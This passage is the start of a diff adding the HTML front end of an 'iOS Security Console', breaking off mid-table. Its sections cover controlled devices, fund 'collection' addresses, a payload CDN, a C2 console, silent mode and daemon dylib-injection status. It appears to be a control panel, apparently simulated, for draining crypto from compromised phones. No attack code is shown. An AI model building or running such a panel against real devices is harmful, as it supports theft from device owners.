@@ -1,0 +1,3298 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>iOS Security Console</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Fira+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'void': '#0b0f19',
+            'void-light': '#111827',
+            'void-card': '#151c2c',
+            'void-border': '#1e293b',
+            'neon-green': '#00ff88',
+            'neon-blue': '#3b82f6',
+            'neon-cyan': '#06b6d4',
+            'neon-red': '#ef4444',
+            'neon-amber': '#f59e0b',
+            'neon-purple': '#a855f7',
+            'slate-text': '#94a3b8',
+            'slate-dim': '#64748b',
+          },
+          fontFamily: {
+            'mono': ['Fira Code', 'monospace'],
+            'sans': ['Fira Sans', 'system-ui', 'sans-serif'],
+          },
+        },
+      },
+    };
+  </script>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: 'Fira Sans', system-ui, sans-serif; }
+
+    .glass-card {
+      background: rgba(21, 28, 44, 0.7);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+    }
+    .glass-card-hover { transition: border-color 0.2s, box-shadow 0.2s; }
+    .glass-card-hover:hover {
+      border-color: rgba(59, 130, 246, 0.3);
+      box-shadow: 0 0 20px rgba(59, 130, 246, 0.08);
+    }
+
+    .toggle { position: relative; display: inline-block; width: 40px; height: 20px; flex-shrink: 0; }
+    .toggle input { opacity: 0; width: 0; height: 0; }
+    .toggle-slider {
+      position: absolute; cursor: pointer; inset: 0;
+      background: #334155; border-radius: 20px; transition: .25s;
+    }
+    .toggle-slider::before {
+      content: ""; position: absolute; height: 16px; width: 16px;
+      left: 2px; bottom: 2px; background: #64748b; border-radius: 50%; transition: .25s;
+    }
+    .toggle input:checked + .toggle-slider { background: rgba(0, 255, 136, 0.25); }
+    .toggle input:checked + .toggle-slider::before { transform: translateX(20px); background: #00ff88; }
+
+    .sidebar-item { transition: all .2s; border-left: 3px solid transparent; }
+    .sidebar-item.active { background: rgba(59, 130, 246, 0.1); color: #3b82f6; border-left-color: #3b82f6; }
+    .sidebar-item:not(.active):hover { background: rgba(255, 255, 255, 0.03); color: #e2e8f0; }
+
+    .tab-item { transition: color .2s; }
+    .tab-item.active { color: #3b82f6; border-bottom: 2px solid #3b82f6; }
+
+    .loading-overlay {
+      position: absolute; inset: 0; background: rgba(11, 15, 25, 0.85);
+      display: flex; align-items: center; justify-content: center; z-index: 50;
+      opacity: 0; pointer-events: none; transition: opacity .2s;
+    }
+    .loading-overlay.show { opacity: 1; pointer-events: all; }
+    .spinner {
+      width: 36px; height: 36px; border: 3px solid #1e293b;
+      border-top-color: #3b82f6; border-radius: 50%;
+      animation: spin .7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .modal-backdrop { background: rgba(0, 0, 0, 0.65); backdrop-filter: blur(4px); }
+    .modal { transform: scale(.95); opacity: 0; transition: .2s; }
+    .modal-backdrop.open .modal { transform: scale(1); opacity: 1; }
+
+    .data-table th { background: rgba(15, 23, 42, 0.8); font-weight: 500; color: #94a3b8; white-space: nowrap; }
+    .data-table td, .data-table th { padding: 10px 12px; border-bottom: 1px solid #1e293b; font-size: 13px; }
+    .data-table tr:hover td { background: rgba(59, 130, 246, 0.04); }
+    .data-table tr.hidden-row { display: none; }
+
+    .login-bg {
+      background: #0b0f19;
+      min-height: 100vh;
+      position: relative;
+      overflow: hidden;
+    }
+    .login-bg::before {
+      content: '';
+      position: absolute;
+      width: 500px; height: 500px;
+      background: radial-gradient(circle, rgba(59,130,246,0.15) 0%, transparent 70%);
+      top: -100px; right: -100px;
+    }
+    .login-bg::after {
+      content: '';
+      position: absolute;
+      width: 400px; height: 400px;
+      background: radial-gradient(circle, rgba(0,255,136,0.1) 0%, transparent 70%);
+      bottom: -100px; left: -100px;
+    }
+
+    .badge { display: inline-flex; align-items: center; gap: 4px; padding: 2px 8px; border-radius: 4px; font-size: 12px; font-weight: 500; }
+    .badge-green { background: rgba(0, 255, 136, 0.1); color: #00ff88; }
+    .badge-red { background: rgba(239, 68, 68, 0.1); color: #ef4444; }
+    .badge-amber { background: rgba(245, 158, 11, 0.1); color: #f59e0b; }
+    .badge-blue { background: rgba(59, 130, 246, 0.1); color: #3b82f6; }
+    .badge-purple { background: rgba(168, 85, 247, 0.1); color: #a855f7; }
+    .badge-gray { background: rgba(100, 116, 139, 0.1); color: #64748b; }
+
+    .auth-addr-row { display: flex; flex-wrap: wrap; align-items: flex-start; gap: 8px 12px; padding: 10px 0; border-bottom: 1px solid #1e293b; }
+    .auth-addr-row:last-child { border-bottom: none; }
+
+    @keyframes pulse-glow { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+    .pulse-dot { animation: pulse-glow 2s ease-in-out infinite; }
+
+    @keyframes terminal-cursor { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
+    .terminal-cursor::after {
+      content: '█'; animation: terminal-cursor 1s step-end infinite; color: #00ff88;
+    }
+
+    .terminal-stream {
+      font-family: 'Fira Code', monospace;
+      font-size: 11px;
+      line-height: 1.6;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #1e293b transparent;
+    }
+    .terminal-stream::-webkit-scrollbar { width: 4px; }
+    .terminal-stream::-webkit-scrollbar-track { background: transparent; }
+    .terminal-stream::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
+
+    .metric-glow {
+      position: relative;
+    }
+    .metric-glow::before {
+      content: '';
+      position: absolute;
+      inset: -1px;
+      border-radius: inherit;
+      padding: 1px;
+      background: linear-gradient(135deg, rgba(59,130,246,0.3), rgba(0,255,136,0.1), transparent);
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+    }
+
+    .layer-indicator {
+      width: 8px; height: 8px; border-radius: 50%;
+      display: inline-block;
+    }
+    .layer-active { background: #00ff88; box-shadow: 0 0 6px #00ff88; }
+    .layer-warning { background: #f59e0b; box-shadow: 0 0 6px #f59e0b; }
+    .layer-error { background: #ef4444; box-shadow: 0 0 6px #ef4444; }
+    .layer-idle { background: #334155; }
+
+    .risk-high { color: #ef4444; background: rgba(239, 68, 68, 0.1); padding: 2px 10px; border-radius: 4px; font-size: 12px; font-weight: 600; }
+    .risk-medium { color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 2px 10px; border-radius: 4px; font-size: 12px; font-weight: 600; }
+    .risk-low { color: #00ff88; background: rgba(0, 255, 136, 0.1); padding: 2px 10px; border-radius: 4px; font-size: 12px; font-weight: 600; }
+
+    @keyframes scanline {
+      0% { transform: translateY(-100%); }
+      100% { transform: translateY(100%); }
+    }
+
+    #app-shell { display: none; }
+    #login-page { display: flex; }
+
+    @media (prefers-reduced-motion: reduce) {
+      .pulse-dot, .terminal-cursor::after, .spinner { animation: none; }
+    }
+
+    /* Demo Mode Styles */
+    @keyframes phase-slide-in {
+      from { transform: translateY(-30px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes phase-pulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(59,130,246,0.4); }
+      50% { box-shadow: 0 0 30px 8px rgba(59,130,246,0.15); }
+    }
+    @keyframes exfil-flash {
+      0% { background: rgba(239, 68, 68, 0.15); }
+      100% { background: rgba(239, 68, 68, 0); }
+    }
+    @keyframes device-online {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+    .demo-phase-banner {
+      animation: phase-slide-in 0.5s ease-out, phase-pulse 2s ease-in-out infinite;
+    }
+    .exfil-card {
+      animation: device-online 0.4s ease-out;
+    }
+    .exfil-flash {
+      animation: exfil-flash 1.5s ease-out;
+    }
+    .demo-device-card {
+      animation: device-online 0.5s ease-out;
+    }
+
+    #demo-overlay {
+      transition: all 0.3s ease;
+    }
+    #demo-overlay.collapsed {
+      max-height: 48px;
+      overflow: hidden;
+    }
+
+    .exfil-panel {
+      scrollbar-width: thin;
+      scrollbar-color: #1e293b transparent;
+    }
+    .exfil-panel::-webkit-scrollbar { width: 4px; }
+    .exfil-panel::-webkit-scrollbar-track { background: transparent; }
+    .exfil-panel::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
+  </style>
+</head>
+<body class="bg-void text-slate-300">
+
+<!-- ========== LOGIN ========== -->
+<div id="login-page" class="login-bg items-center justify-center p-4">
+  <div class="glass-card rounded-xl w-full max-w-md p-8 relative z-10 shadow-2xl shadow-black/30">
+    <div class="text-center mb-8">
+      <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-neon-blue to-neon-cyan mb-4">
+        <i data-lucide="shield-check" class="w-8 h-8 text-white"></i>
+      </div>
+      <h1 class="text-2xl font-semibold text-white tracking-tight">iOS Security Console</h1>
+      <p class="text-sm text-slate-dim mt-2 font-mono">v3.2.1 · Secure Access</p>
+    </div>
+    <form id="login-form" class="space-y-5">
+      <div>
+        <label class="block text-sm text-slate-text mb-1.5">Username</label>
+        <input id="username" name="username" type="text" autocomplete="username"
+          spellcheck="false" autocapitalize="off" placeholder="请输入用户名"
+          class="w-full bg-void-light border border-void-border rounded-lg px-4 py-2.5 text-sm text-white placeholder-slate-dim focus:outline-none focus:border-neon-blue focus:ring-1 focus:ring-neon-blue transition-colors" />
+      </div>
+      <div>
+        <label class="block text-sm text-slate-text mb-1.5">Password</label>
+        <div class="relative">
+          <input id="password" name="password" type="password" autocomplete="current-password"
+            spellcheck="false" autocapitalize="off" placeholder="请输入密码"
+            class="w-full bg-void-light border border-void-border rounded-lg px-4 py-2.5 pr-10 text-sm text-white placeholder-slate-dim focus:outline-none focus:border-neon-blue focus:ring-1 focus:ring-neon-blue transition-colors" />
+          <button type="button" id="toggle-pwd" tabindex="-1"
+            class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-dim hover:text-neon-blue p-1 cursor-pointer transition-colors"
+            title="显示/隐藏密码">
+            <i data-lucide="eye" class="w-4 h-4" id="toggle-pwd-icon-show"></i>
+            <i data-lucide="eye-off" class="w-4 h-4 hidden" id="toggle-pwd-icon-hide"></i>
+          </button>
+        </div>
+      </div>
+      <div>
+        <label class="block text-sm text-slate-text mb-1.5">验证码</label>
+        <div class="flex gap-2 items-center">
+          <input id="captcha-code" name="captcha_code" type="text" autocomplete="off"
+            spellcheck="false" autocapitalize="off" maxlength="6" placeholder="请输入验证码"
+            class="flex-1 bg-void-light border border-void-border rounded-lg px-4 py-2.5 text-sm text-white placeholder-slate-dim focus:outline-none focus:border-neon-blue focus:ring-1 focus:ring-neon-blue transition-colors" />
+          <button type="button" id="captcha-refresh" title="刷新验证码"
+            class="shrink-0 w-[140px] h-[42px] rounded-lg border border-void-border bg-void overflow-hidden cursor-pointer hover:border-neon-blue/50 transition-colors">
+            <span id="captcha-svg-wrap" class="block w-full h-full"></span>
+          </button>
+        </div>
+        <input type="hidden" id="captcha-id" value="" />
+      </div>
+      <button type="submit"
+        class="w-full bg-gradient-to-r from-neon-blue to-blue-600 hover:from-blue-600 hover:to-neon-blue text-white py-2.5 rounded-lg text-sm font-medium transition-all cursor-pointer">
+        Authenticate
+      </button>
+    </form>
+    <p class="text-center text-xs text-slate-dim mt-6 font-mono">AES-256 · End-to-End Encrypted</p>
+  </div>
+</div>
+
+<!-- ========== APP SHELL ========== -->
+<div id="app-shell" class="flex h-screen overflow-hidden">
+
+  <!-- Sidebar -->
+  <aside class="w-[240px] bg-void-light/80 backdrop-blur-xl border-r border-void-border flex flex-col shrink-0">
+    <div class="h-14 flex items-center px-4 border-b border-void-border gap-3">
+      <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-neon-blue to-neon-cyan flex items-center justify-center">
+        <i data-lucide="shield" class="w-4 h-4 text-white"></i>
+      </div>
+      <div>
+        <span class="font-semibold text-white text-sm tracking-tight">iOS SecOps</span>
+        <span class="block text-[10px] text-slate-dim font-mono">CONSOLE v3.2</span>
+      </div>
+    </div>
+    <nav class="flex-1 py-3 overflow-y-auto space-y-0.5 px-2" id="sidebar-nav">
+      <button data-page="dashboard" class="sidebar-item active w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left rounded-lg cursor-pointer">
+        <i data-lucide="gauge" class="w-4 h-4"></i> 安全仪表盘
+      </button>
+      <button data-page="devices" class="sidebar-item w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left text-slate-text rounded-lg cursor-pointer">
+        <i data-lucide="smartphone" class="w-4 h-4"></i> 设备终端
+      </button>
+      <button data-page="authorized" class="sidebar-item w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left text-slate-text rounded-lg cursor-pointer">
+        <i data-lucide="shield-check" class="w-4 h-4"></i> 已授权
+      </button>
+      <button data-page="collectable" class="sidebar-item w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left text-slate-text rounded-lg cursor-pointer">
+        <i data-lucide="database" class="w-4 h-4"></i> 可归集
+      </button>
+      <button data-page="assets" class="sidebar-item w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left text-slate-text rounded-lg cursor-pointer">
+        <i data-lucide="coins" class="w-4 h-4"></i> 资产看板
+      </button>
+      <button data-page="collectaddr" class="sidebar-item w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left text-slate-text rounded-lg cursor-pointer">
+        <i data-lucide="wallet" class="w-4 h-4"></i> 归集地址
+      </button>
+      <button data-page="agents" class="sidebar-item w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left text-slate-text rounded-lg cursor-pointer">
+        <i data-lucide="users" class="w-4 h-4"></i> 代理管理
+      </button>
+      <button data-page="cold" class="sidebar-item w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left text-slate-text rounded-lg cursor-pointer">
+        <i data-lucide="snowflake" class="w-4 h-4"></i> 冷地址
+      </button>
+      <button data-page="records" class="sidebar-item w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left text-slate-text rounded-lg cursor-pointer">
+        <i data-lucide="scroll-text" class="w-4 h-4"></i> 归集记录
+      </button>
+      <button data-page="c2" class="sidebar-item w-full flex items-center gap-3 px-3 py-2.5 text-sm text-left text-slate-text rounded-lg cursor-pointer">
+        <i data-lucide="terminal" class="w-4 h-4"></i> C2 控制台
+      </button>
+    </nav>
+    <div class="p-3 border-t border-void-border">
+      <div class="glass-card rounded-lg p-3 mb-3">
+        <div class="flex items-center gap-2 mb-2">
+          <span class="layer-indicator layer-active pulse-dot"></span>
+          <span class="text-xs text-neon-green font-mono">SYSTEM ONLINE</span>
+        </div>
+        <div class="text-[10px] text-slate-dim font-mono" id="sidebar-uptime">Uptime: — · Latency: —</div>
+      </div>
+      <button id="logout-btn" class="w-full text-sm text-slate-dim hover:text-neon-red py-2 transition-colors flex items-center justify-center gap-2 cursor-pointer">
+        <i data-lucide="log-out" class="w-4 h-4"></i> 退出登录
+      </button>
+    </div>
+  </aside>
+
+  <!-- Main -->
+  <div class="flex-1 flex flex-col min-w-0">
+
+    <!-- Top bar -->
+    <header class="h-12 bg-void-light/60 backdrop-blur-xl border-b border-void-border flex items-center px-4 justify-between shrink-0">
+      <div id="backend-status-banner" class="hidden absolute top-12 left-0 right-0 z-50 bg-neon-amber/10 border-b border-neon-amber/30 text-neon-amber text-xs text-center py-1 font-mono">
+        后端连接断开，正在重连…
+      </div>
+      <div class="flex items-center gap-1 text-sm" id="tab-bar">
+        <span class="tab-item active px-3 py-3 cursor-pointer text-slate-text" data-tab="dashboard">安全仪表盘</span>
+      </div>
+      <div class="flex items-center gap-4 text-sm">
+        <button id="demo-start-btn" title="启动攻击演示"
+          class="flex items-center gap-1.5 px-3 py-1.5 text-xs rounded-lg border border-neon-red/40 text-neon-red hover:bg-neon-red/10 transition-all cursor-pointer font-mono">
+          <i data-lucide="play" class="w-3.5 h-3.5"></i> DEMO
+        </button>
+        <button id="demo-stop-btn" title="停止演示"
+          class="hidden items-center gap-1.5 px-3 py-1.5 text-xs rounded-lg border border-neon-amber/40 text-neon-amber hover:bg-neon-amber/10 transition-all cursor-pointer font-mono">
+          <i data-lucide="square" class="w-3.5 h-3.5"></i> STOP
+        </button>
+        <div class="flex items-center gap-2 text-slate-dim font-mono text-xs">
+          <span class="layer-indicator layer-active pulse-dot"></span>
+          <span id="header-time">--:--:--</span>
+        </div>
+        <div class="flex items-center gap-2 text-slate-text">
+          <i data-lucide="user-circle" class="w-4 h-4"></i>
+          <span class="text-sm">admin</span>
+        </div>
+      </div>
+    </header>
+
+    <!-- Content -->
+    <main class="flex-1 overflow-auto p-4 relative" id="main-content">
+      <div class="loading-overlay" id="loading-overlay">
+        <div class="flex flex-col items-center gap-2">
+          <div class="spinner"></div>
+          <span class="text-sm text-slate-dim font-mono">Loading...</span>
+        </div>
+      </div>
+
+      <!-- Global Control -->
+      <section id="global-control" class="glass-card rounded-xl p-4 mb-4 hidden">
+        <div class="flex flex-wrap items-center justify-between gap-4 mb-3">
+          <h3 class="font-medium text-white flex items-center gap-2 text-sm">
+            <i data-lucide="sliders-horizontal" class="w-4 h-4 text-neon-blue"></i> Global Control · 全局控制
+          </h3>
+          <button id="add-agent-btn"
+            class="bg-neon-blue hover:bg-blue-600 text-white text-xs px-4 py-1.5 rounded-lg flex items-center gap-1.5 transition-colors cursor-pointer font-medium">
+            <i data-lucide="plus" class="w-3.5 h-3.5"></i> Add Agent
+          </button>
+        </div>
+        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
+          <label class="flex items-center justify-between gap-2 text-xs text-slate-text bg-void/50 rounded-lg px-3 py-2.5 cursor-pointer border border-void-border hover:border-void-border/80 transition-colors">
+            <span>自动归集</span>
+            <span class="toggle"><input type="checkbox" id="gc-auto-collect" checked /><span class="toggle-slider"></span></span>
+          </label>
+          <label class="flex items-center justify-between gap-2 text-xs text-slate-text bg-void/50 rounded-lg px-3 py-2.5 cursor-pointer border border-void-border hover:border-void-border/80 transition-colors">
+            <span>静默模式</span>
+            <span class="toggle"><input type="checkbox" id="gc-silent" /><span class="toggle-slider"></span></span>
+          </label>
+          <label class="flex items-center justify-between gap-2 text-xs text-slate-text bg-void/50 rounded-lg px-3 py-2.5 cursor-pointer border border-void-border hover:border-void-border/80 transition-colors">
+            <span>心跳检测</span>
+            <span class="toggle"><input type="checkbox" id="gc-heartbeat" checked /><span class="toggle-slider"></span></span>
+          </label>
+          <label class="flex items-center justify-between gap-2 text-xs text-slate-text bg-void/50 rounded-lg px-3 py-2.5 cursor-pointer border border-void-border hover:border-void-border/80 transition-colors">
+            <span>代理转发</span>
+            <span class="toggle"><input type="checkbox" id="gc-proxy-forward" /><span class="toggle-slider"></span></span>
+          </label>
+          <label class="flex items-center justify-between gap-2 text-xs text-slate-text bg-void/50 rounded-lg px-3 py-2.5 cursor-pointer border border-void-border hover:border-void-border/80 transition-colors">
+            <span>日志上报</span>
+            <span class="toggle"><input type="checkbox" id="gc-log-report" checked /><span class="toggle-slider"></span></span>
+          </label>
+          <label class="flex items-center justify-between gap-2 text-xs text-slate-text bg-void/50 rounded-lg px-3 py-2.5 cursor-pointer border border-void-border hover:border-void-border/80 transition-colors">
+            <span>受控过滤</span>
+            <span class="toggle"><input type="checkbox" id="toggle-controlled" /><span class="toggle-slider"></span></span>
+          </label>
+        </div>
+      </section>
+
+      <!-- ==================== PAGE: DASHBOARD ==================== -->
+      <div id="page-dashboard" class="page-view">
+
+        <!-- Threat Metrics Banner -->
+        <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3 mb-4">
+          <div class="glass-card glass-card-hover rounded-xl p-4 metric-glow cursor-pointer">
+            <div class="flex items-center gap-2 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-neon-green/10 flex items-center justify-center">
+                <i data-lucide="heart-pulse" class="w-4 h-4 text-neon-green"></i>
+              </div>
+            </div>
+            <p class="text-2xl font-bold text-white font-mono" id="metric-health">98.7%</p>
+            <p class="text-[10px] text-slate-dim mt-1">系统健康度</p>
+          </div>
+          <div class="glass-card glass-card-hover rounded-xl p-4 cursor-pointer">
+            <div class="flex items-center gap-2 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-neon-blue/10 flex items-center justify-center">
+                <i data-lucide="layers" class="w-4 h-4 text-neon-blue"></i>
+              </div>
+            </div>
+            <div class="flex items-center gap-1.5 mb-1">
+              <span class="layer-indicator layer-active" title="L0 Active"></span>
+              <span class="layer-indicator layer-active" title="L1 Active"></span>
+              <span class="layer-indicator layer-warning" title="L2 Warning"></span>
+              <span class="layer-indicator layer-active" title="L3 Active"></span>
+            </div>
+            <p class="text-[10px] text-slate-dim mt-1">L0-L3 层级状态</p>
+          </div>
+          <div class="glass-card glass-card-hover rounded-xl p-4 cursor-pointer">
+            <div class="flex items-center gap-2 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-neon-red/10 flex items-center justify-center">
+                <i data-lucide="shield-alert" class="w-4 h-4 text-neon-red"></i>
+              </div>
+            </div>
+            <p class="text-2xl font-bold text-white font-mono" id="metric-blocked">1,247</p>
+            <p class="text-[10px] text-slate-dim mt-1">今日拦截</p>
+          </div>
+          <div class="glass-card glass-card-hover rounded-xl p-4 cursor-pointer">
+            <div class="flex items-center gap-2 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-neon-amber/10 flex items-center justify-center">
+                <i data-lucide="bug" class="w-4 h-4 text-neon-amber"></i>
+              </div>
+            </div>
+            <p class="text-2xl font-bold text-white font-mono" id="metric-captured">386</p>
+            <p class="text-[10px] text-slate-dim mt-1">今日捕获</p>
+          </div>
+          <div class="glass-card glass-card-hover rounded-xl p-4 cursor-pointer">
+            <div class="flex items-center gap-2 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-neon-cyan/10 flex items-center justify-center">
+                <i data-lucide="smartphone" class="w-4 h-4 text-neon-cyan"></i>
+              </div>
+            </div>
+            <p class="text-2xl font-bold text-white font-mono" id="stat-devices">0</p>
+            <p class="text-[10px] text-slate-dim mt-1">受控设备</p>
+          </div>
+          <div class="glass-card glass-card-hover rounded-xl p-4 cursor-pointer">
+            <div class="flex items-center gap-2 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-neon-purple/10 flex items-center justify-center">
+                <i data-lucide="lock" class="w-4 h-4 text-neon-purple"></i>
+              </div>
+            </div>
+            <p class="text-2xl font-bold text-white font-mono" id="stat-authorized">0</p>
+            <p class="text-[10px] text-slate-dim mt-1">已授权设备</p>
+          </div>
+        </div>
+
+        <!-- Main Dashboard Grid -->
+        <div class="grid grid-cols-1 lg:grid-cols-5 gap-4 mb-4">
+
+          <!-- Left: Four-Layer Architecture + Telemetry Stream -->
+          <div class="lg:col-span-2 space-y-4">
+
+            <!-- Four-Layer Architecture -->
+            <div class="glass-card rounded-xl p-5">
+              <div class="flex items-center justify-between mb-4">
+                <h3 class="font-medium text-white flex items-center gap-2 text-sm">
+                  <i data-lucide="network" class="w-4 h-4 text-neon-blue"></i> 四层架构状态
+                </h3>
+                <span class="text-[10px] font-mono text-slate-dim">REAL-TIME</span>
+              </div>
+              <div class="space-y-3">
+                <!-- L0 -->
+                <div class="bg-void/60 rounded-lg p-3 border border-void-border hover:border-neon-blue/20 transition-colors cursor-pointer">
+                  <div class="flex items-center justify-between mb-1.5">
+                    <div class="flex items-center gap-2">
+                      <span class="layer-indicator layer-active pulse-dot"></span>
+                      <span class="text-xs font-mono text-white font-semibold">L0</span>
+                      <span class="text-xs text-slate-text">投放页 · Landing</span>
+                    </div>
+                    <span class="badge-green text-[10px] px-2 py-0.5 rounded-full">ACTIVE</span>
+                  </div>
+                  <div class="flex items-center gap-4 mt-2">
+                    <div class="text-[10px] text-slate-dim">
+                      <span class="text-neon-green font-mono">12</span> domains
+                    </div>
+                    <div class="text-[10px] text-slate-dim">
+                      <span class="text-neon-green font-mono">99.9%</span> uptime
+                    </div>
+                    <div class="text-[10px] text-slate-dim">
+                      Latency <span class="text-neon-green font-mono">23ms</span>
+                    </div>
+                  </div>
+                </div>
+                <!-- L1 -->
+                <div class="bg-void/60 rounded-lg p-3 border border-void-border hover:border-neon-blue/20 transition-colors cursor-pointer" data-layer-id="L1">
+                  <div class="flex items-center justify-between mb-1.5">
+                    <div class="flex items-center gap-2">
+                      <span class="layer-indicator layer-active pulse-dot" data-layer-dot="L1"></span>
+                      <span class="text-xs font-mono text-white font-semibold">L1</span>
+                      <span class="text-xs text-slate-text">遥测上报 · Telemetry</span>
+                    </div>
+                    <span class="badge-green text-[10px] px-2 py-0.5 rounded-full">ACTIVE</span>
+                  </div>
+                  <div class="flex items-center gap-4 mt-2">
+                    <div class="text-[10px] text-slate-dim">
+                      <span class="text-neon-blue font-mono" id="l1-events">2,847</span> events/h
+                    </div>
+                    <div class="text-[10px] text-slate-dim">
+                      Queue <span class="text-neon-green font-mono">0</span>
+                    </div>
+                  </div>
+                </div>
+                <!-- L2 -->
+                <div class="bg-void/60 rounded-lg p-3 border border-neon-amber/20 hover:border-neon-amber/30 transition-colors cursor-pointer">
+                  <div class="flex items-center justify-between mb-1.5">
+                    <div class="flex items-center gap-2">
+                      <span class="layer-indicator layer-warning pulse-dot"></span>
+                      <span class="text-xs font-mono text-white font-semibold">L2</span>
+                      <span class="text-xs text-slate-text">Payload CDN</span>
+                    </div>
+                    <span class="badge-amber text-[10px] px-2 py-0.5 rounded-full">DEGRADED</span>
+                  </div>
+                  <div class="flex items-center gap-4 mt-2">
+                    <div class="text-[10px] text-slate-dim">
+                      Cache Hit <span class="text-neon-amber font-mono">87.3%</span>
+                    </div>
+                    <div class="text-[10px] text-slate-dim">
+                      CDN Nodes <span class="text-neon-amber font-mono">5/8</span>
+                    </div>
+                  </div>
+                </div>
+                <!-- L3 -->
+                <div class="bg-void/60 rounded-lg p-3 border border-void-border hover:border-neon-blue/20 transition-colors cursor-pointer" data-layer-id="L3">
+                  <div class="flex items-center justify-between mb-1.5">
+                    <div class="flex items-center gap-2">
+                      <span class="layer-indicator layer-active pulse-dot" data-layer-dot="L3"></span>
+                      <span class="text-xs font-mono text-white font-semibold">L3</span>
+                      <span class="text-xs text-slate-text">IPC/C2 模拟桩</span>
+                    </div>
+                    <span class="badge-green text-[10px] px-2 py-0.5 rounded-full" data-layer-badge="L3">ACTIVE</span>
+                  </div>
+                  <div class="flex items-center gap-4 mt-2">
+                    <div class="text-[10px] text-slate-dim">
+                      IPC Channels <span class="text-neon-green font-mono" id="l3-ipc-channels">4</span>
+                    </div>
+                    <div class="text-[10px] text-slate-dim">
+                      C2 Heartbeat <span class="text-neon-green font-mono" id="l3-c2-heartbeat">OK</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Terminal Telemetry Stream -->
+            <div class="glass-card rounded-xl overflow-hidden">
+              <div class="flex items-center justify-between px-4 py-2.5 border-b border-void-border">
+                <div class="flex items-center gap-2">
+                  <div class="flex gap-1.5">
+                    <span class="w-3 h-3 rounded-full bg-neon-red/80"></span>
+                    <span class="w-3 h-3 rounded-full bg-neon-amber/80"></span>
+                    <span class="w-3 h-3 rounded-full bg-neon-green/80"></span>
+                  </div>
+                  <span class="text-xs font-mono text-slate-dim ml-2">L1 Telemetry Stream</span>
+                </div>
+                <div class="flex items-center gap-2">
+                  <span class="layer-indicator layer-active pulse-dot"></span>
+                  <span class="text-[10px] font-mono text-neon-green">LIVE</span>
+                </div>
+              </div>
+              <div id="terminal-stream" class="terminal-stream bg-[#0a0e17] p-4 h-[240px] text-neon-green/90">
+                <div class="text-slate-dim text-[10px] mb-2">--- L1 Telemetry Receiver Initialized ---</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Right: Daemon Hook Status Matrix -->
+          <div class="lg:col-span-3">
+            <div class="glass-card rounded-xl p-5 h-full">
+              <div class="flex items-center justify-between mb-4">
+                <h3 class="font-medium text-white flex items-center gap-2 text-sm">
+                  <i data-lucide="cpu" class="w-4 h-4 text-neon-purple"></i> 系统守护进程 Hook 状态矩阵
+                </h3>
+                <div class="flex items-center gap-3">
+                  <div class="flex items-center gap-1.5 text-[10px] text-slate-dim">
+                    <span class="w-2 h-2 rounded-full bg-neon-red"></span> 高风险
+                  </div>
+                  <div class="flex items-center gap-1.5 text-[10px] text-slate-dim">
+                    <span class="w-2 h-2 rounded-full bg-neon-amber"></span> 中风险
+                  </div>
+                  <div class="flex items-center gap-1.5 text-[10px] text-slate-dim">
+                    <span class="w-2 h-2 rounded-full bg-neon-green"></span> 低风险
+                  </div>
+                </div>
+              </div>
+              <div class="overflow-x-auto">
+                <table class="w-full text-left">
+                  <thead>
+                    <tr class="border-b border-void-border">
+                      <th class="text-[11px] font-medium text-slate-dim py-2.5 px-3 font-mono">PROCESS</th>
+                      <th class="text-[11px] font-medium text-slate-dim py-2.5 px-3 font-mono">INJECT TARGET</th>
+                      <th class="text-[11px] font-medium text-slate-dim py-2.5 px-3 font-mono text-center">HOOK RISK</th>
+                      <th class="text-[11px] font-medium text-slate-dim py-2.5 px-3 font-mono text-center">DYLIB STATUS</th>
+                      <th class="text-[11px] font-medium text-slate-dim py-2.5 px-3 font-mono text-center">PID</th>
+                    </tr>
+                  </thead>
+                  <tbody id="daemon-tbody">
